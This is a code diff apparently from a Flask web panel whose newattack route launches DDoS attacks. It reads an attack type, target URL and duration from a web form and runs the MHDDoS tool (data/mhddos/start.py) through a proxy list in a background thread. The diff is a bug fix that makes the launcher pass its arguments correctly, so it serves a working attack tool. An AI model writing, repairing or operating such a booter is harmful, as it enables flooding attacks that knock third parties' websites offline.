@@ -63,10 +63,10 @@ def newattack():
         url = request.form["url"]
         time = request.form["time"]
         # startinng the attack 
-        out = ""
+        out = "ERROR"
         def run_attack():
             global out
-            arguments = [f"{type_attack}", f"{url}", 0, 100, "proxies.txt", time]
+            arguments = [f"{type_attack}", f"{url}", str(0), str(100), "proxies.txt", f"{time}"]
             command = ["python3", "data/mhddos/start.py"] + arguments
             process = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
             
@@ -75,6 +75,7 @@ def newattack():
                 out += line + "\n"
             LOGS.info(f"Attack output: {out}")
             LOGS.info("Attack completed")
+
         attack_thread = threading.Thread(target=run_attack)
         attack_thread.start()
         flash(f"Attack launched \n {out}")
